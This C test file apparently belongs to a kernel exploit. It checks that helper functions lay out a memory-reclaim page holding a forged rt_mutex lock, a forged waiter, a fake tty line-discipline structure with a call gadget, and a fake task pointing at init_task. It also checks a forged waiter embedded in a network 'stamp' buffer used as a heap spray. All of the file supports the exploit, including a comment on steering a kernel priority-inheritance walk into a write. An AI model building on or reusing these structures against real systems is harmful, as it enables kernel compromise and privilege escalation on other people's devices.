#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "kara_reclaim_layout.h"

static uint32_t word(const uint8_t *buffer, unsigned offset)
{
    uint32_t value;
    memcpy(&value, buffer + offset, sizeof(value));
    return value;
}

static void test_reclaimed_page(void)
{
    uint8_t page[KARA_MM_SLAB_SIZE];
    struct kara_reclaim_addresses a;
    const uint32_t base = 0xd246c000u;

    kara_fill_reclaim_page(page, base, &a);
    assert(a.fake_lock == base + KARA_FAKE_LOCK_OFF);
    assert(a.fake_waiter == base + KARA_FAKE_WAITER_OFF);
    assert(a.fake_ldisc == base + KARA_FAKE_LDISC_OFF);
    assert(a.fake_task == base + KARA_FAKE_TASK_OFF);

    assert(word(page, KARA_FAKE_LOCK_OFF + 0x00) == 0);
    assert(word(page, KARA_FAKE_LOCK_OFF + 0x04) == a.fake_waiter);
    assert(word(page, KARA_FAKE_LOCK_OFF + 0x08) == a.fake_waiter);
    /* Ownerless with HAS_WAITERS set: exit the PI walk after the rb write. */
    assert(word(page, KARA_FAKE_LOCK_OFF + 0x0c) == 1u);

    assert(word(page, KARA_FAKE_WAITER_OFF + 0x00) == 1u);
    assert(word(page, KARA_FAKE_WAITER_OFF + 0x18) == KARA_INIT_TASK);
    assert(word(page, KARA_FAKE_WAITER_OFF + 0x1c) == a.fake_lock);
    assert(word(page, KARA_FAKE_WAITER_OFF + 0x20) == 0u);

    assert(word(page, KARA_FAKE_LDISC_OFF + 0x00) == KARA_TTY_LDISC_MAGIC);
    assert(word(page, KARA_FAKE_LDISC_OFF + 0x08) == KARA_LDISC_SLOT);
    assert(word(page, KARA_FAKE_LDISC_OFF + 0x24) == KARA_LDISC_CALL_GADGET);
    assert(word(page, KARA_FAKE_LDISC_OFF + 0x48) == 0u);
    assert(word(page, KARA_FAKE_LDISC_OFF + 0x4c) == 0u);

    assert(word(page, KARA_FAKE_TASK_OFF + 0x08) == 0x100u);
    assert(word(page, KARA_FAKE_TASK_OFF + KARA_TASK_PRIO_OFF) == 120u);
    assert(word(page, KARA_FAKE_TASK_OFF + KARA_TASK_PI_LOCK_OFF) == 0u);
    assert(word(page, KARA_FAKE_TASK_OFF + KARA_TASK_PI_WAITERS_OFF) == 0u);
    assert(word(page, KARA_FAKE_TASK_OFF + KARA_TASK_PI_WAITERS_OFF + 4u) == 0u);
    assert(word(page, KARA_FAKE_TASK_OFF + KARA_TASK_PI_BLOCKED_ON_OFF) == 0u);
}

static void test_tcp_stamp(void)
{
    uint8_t stamp[KARA_MCAST_COPY_SIZE];
    uint8_t waiter[KARA_RT_WAITER_SIZE];
    struct kara_reclaim_addresses a = {
        .fake_lock = 0xd246c100u,
        .fake_waiter = 0xd246c140u,
        .fake_ldisc = 0xd246c200u,
        .fake_task = 0xd246c400u,
    };

    kara_build_forged_waiter(waiter, &a);
    kara_build_tcp_stamp(stamp, &a);

    assert(KARA_MCAST_TO_WAITER == 0x30u);
    assert(!memcmp(stamp + KARA_MCAST_TO_WAITER,
                   waiter, sizeof(waiter)));
    assert(word(waiter, 0x00) == a.fake_ldisc);
    assert(word(waiter, 0x04) == 0u);
    assert(word(waiter, 0x08) == KARA_LDISC_TARGET);
    assert(word(waiter, 0x18) == KARA_INIT_TASK);
    assert(word(waiter, 0x1c) == a.fake_lock);
    assert(word(waiter, 0x20) == 0x7fffffffu);
}

int main(void)
{
    test_reclaimed_page();
    test_tcp_stamp();
    puts("kara_reclaim_layout_test: PASS");
    return 0;
}
